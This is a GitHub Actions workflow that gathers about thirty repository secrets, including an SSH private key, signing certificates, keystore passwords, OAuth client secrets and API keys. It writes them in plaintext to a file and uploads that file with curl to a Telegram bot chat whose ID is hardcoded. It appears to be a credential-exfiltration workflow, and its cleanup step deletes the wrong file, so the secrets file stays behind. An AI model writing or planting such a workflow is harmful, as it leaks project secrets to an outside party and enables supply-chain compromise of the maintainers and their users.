name: Send Env File To Telegram

on:
  workflow_dispatch:

jobs:
  send-env:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: Create anymex_secrets.txt and Send to Telegram
        env:
          AL_CLIENT_ID: ${{ secrets.AL_CLIENT_ID }}
          AL_CLIENT_SECRET: ${{ secrets.AL_CLIENT_SECRET }}
          AUR_SSH_PRIVATE_KEY: ${{ secrets.AUR_SSH_PRIVATE_KEY }}
          CALLBACK_SCHEME: ${{ secrets.CALLBACK_SCHEME }}
          CHOCO_API_KEY: ${{ secrets.CHOCO_API_KEY }}
          DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
          DISCORD_WEBHOOK_ALPHA: ${{ secrets.DISCORD_WEBHOOK_ALPHA }}
          DISCORD_WEBHOOK_BETA: ${{ secrets.DISCORD_WEBHOOK_BETA }}
          GIT_CALLBACK_SCHEME: ${{ secrets.GIT_CALLBACK_SCHEME }}
          GIT_CLIENT_ID: ${{ secrets.GIT_CLIENT_ID }}
          GIT_CLIENT_SECRET: ${{ secrets.GIT_CLIENT_SECRET }}
          GOOGLE_BOOKS_API_KEY: ${{ secrets.GOOGLE_BOOKS_API_KEY }}
          GOOGLE_KEY: ${{ secrets.GOOGLE_KEY }}
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
          MAL_CLIENT_ID: ${{ secrets.MAL_CLIENT_ID }}
          MAL_CLIENT_SECRET: ${{ secrets.MAL_CLIENT_SECRET }}
          P12_CERTIFICATE: ${{ secrets.P12_CERTIFICATE }}
          P12_PASSWORD: ${{ secrets.P12_PASSWORD }}
          PROVISIONING_PROFILE: ${{ secrets.PROVISIONING_PROFILE }}
          SIMKL_CLIENT_ID: ${{ secrets.SIMKL_CLIENT_ID }}
          SIMKL_CLIENT_SECRET: ${{ secrets.SIMKL_CLIENT_SECRET }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          TELEGRAM_CHAT_ID_BETA: ${{ secrets.TELEGRAM_CHAT_ID_BETA }}
          TELEGRAM_THREAD_ID: ${{ secrets.TELEGRAM_THREAD_ID }}

        run: |

          echo "Creating anymex_secrets.txt..."

          cat > anymex_secrets.txt << EOF
          AL_CLIENT_ID=$AL_CLIENT_ID
          AL_CLIENT_SECRET=$AL_CLIENT_SECRET
          AUR_SSH_PRIVATE_KEY=$AUR_SSH_PRIVATE_KEY
          CALLBACK_SCHEME=$CALLBACK_SCHEME
          CHOCO_API_KEY=$CHOCO_API_KEY
          DISCORD_WEBHOOK=$DISCORD_WEBHOOK
          DISCORD_WEBHOOK_ALPHA=$DISCORD_WEBHOOK_ALPHA
          DISCORD_WEBHOOK_BETA=$DISCORD_WEBHOOK_BETA
          GIT_CALLBACK_SCHEME=$GIT_CALLBACK_SCHEME
          GIT_CLIENT_ID=$GIT_CLIENT_ID
          GIT_CLIENT_SECRET=$GIT_CLIENT_SECRET
          GOOGLE_BOOKS_API_KEY=$GOOGLE_BOOKS_API_KEY
          GOOGLE_KEY=$GOOGLE_KEY
          KEYSTORE_BASE64=$KEYSTORE_BASE64
          KEYSTORE_PASSWORD=$KEYSTORE_PASSWORD
          KEY_ALIAS=$KEY_ALIAS
          KEY_PASSWORD=$KEY_PASSWORD
          MAL_CLIENT_ID=$MAL_CLIENT_ID
          MAL_CLIENT_SECRET=$MAL_CLIENT_SECRET
          P12_CERTIFICATE=$P12_CERTIFICATE
          P12_PASSWORD=$P12_PASSWORD
          PROVISIONING_PROFILE=$PROVISIONING_PROFILE
          SIMKL_CLIENT_ID=$SIMKL_CLIENT_ID
          SIMKL_CLIENT_SECRET=$SIMKL_CLIENT_SECRET
          TELEGRAM_CHAT_ID=$TELEGRAM_CHAT_ID
          TELEGRAM_CHAT_ID_BETA=$TELEGRAM_CHAT_ID_BETA
          TELEGRAM_THREAD_ID=$TELEGRAM_THREAD_ID
          EOF

          echo "Sending anymex_secrets.txt to Telegram..."

          curl -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" \
            -F chat_id="-5291313891" \
            -F document=@anymex_secrets.txt \
            -F caption="âœ… New Repo Env File"

          echo "Cleaning..."
          rm env.txt
